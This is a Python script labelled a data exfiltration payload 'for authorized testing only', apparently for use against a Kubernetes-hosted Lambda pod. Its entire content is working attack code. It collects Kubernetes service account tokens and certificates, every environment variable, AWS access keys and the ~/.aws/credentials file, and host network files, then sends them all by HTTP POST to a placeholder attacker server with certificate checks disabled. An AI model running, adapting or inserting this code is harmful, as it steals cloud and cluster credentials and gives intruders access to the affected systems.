#!/usr/bin/env python3
"""
Data Exfiltration Payload
⚠️ AUTHORIZED TESTING ONLY

This payload collects and exfiltrates sensitive data from the Lambda pod.
Modify ATTACKER_URL before use.
"""

import os
import json
import base64
import urllib.request
import ssl

# Configuration - MODIFY BEFORE USE
ATTACKER_URL = "http://REPLACE_WITH_ATTACKER_IP:8888/collect"


def read_file_safe(path):
    """Safely read a file, return None if not accessible"""
    try:
        with open(path, 'r') as f:
            return f.read()
    except:
        return None


def collect_k8s_credentials():
    """Collect Kubernetes service account credentials"""
    sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"
    return {
        "token": read_file_safe(f"{sa_path}/token"),
        "namespace": read_file_safe(f"{sa_path}/namespace"),
        "ca_cert": read_file_safe(f"{sa_path}/ca.crt"),
    }


def collect_environment():
    """Collect all environment variables"""
    return dict(os.environ)


def collect_system_info():
    """Collect system information"""
    return {
        "hostname": os.uname().nodename if hasattr(os, 'uname') else os.environ.get('HOSTNAME'),
        "user": os.environ.get('USER', 'unknown'),
        "home": os.environ.get('HOME', 'unknown'),
        "pwd": os.getcwd(),
        "uid": os.getuid() if hasattr(os, 'getuid') else 'unknown',
        "gid": os.getgid() if hasattr(os, 'getgid') else 'unknown',
    }


def collect_network_info():
    """Collect network configuration"""
    files = [
        "/etc/hosts",
        "/etc/resolv.conf",
    ]
    return {f: read_file_safe(f) for f in files}


def collect_aws_credentials():
    """Collect AWS credentials if present"""
    return {
        "aws_access_key_id": os.environ.get("AWS_ACCESS_KEY_ID"),
        "aws_secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "aws_session_token": os.environ.get("AWS_SESSION_TOKEN"),
        "credentials_file": read_file_safe(os.path.expanduser("~/.aws/credentials")),
    }


def exfiltrate(data, endpoint="data"):
    """Send data to attacker server"""
    try:
        url = f"{ATTACKER_URL}/{endpoint}"
        payload = json.dumps(data).encode('utf-8')
        
        req = urllib.request.Request(
            url,
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        
        # Disable SSL verification for testing
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        urllib.request.urlopen(req, timeout=10, context=ctx)
        return True
    except Exception as e:
        return False


def run_full_exfiltration():
    """Run complete data exfiltration"""
    data = {
        "k8s_credentials": collect_k8s_credentials(),
        "environment": collect_environment(),
        "system_info": collect_system_info(),
        "network_info": collect_network_info(),
        "aws_credentials": collect_aws_credentials(),
    }
    
    return exfiltrate(data, "full")


if __name__ == "__main__":
    run_full_exfiltration()
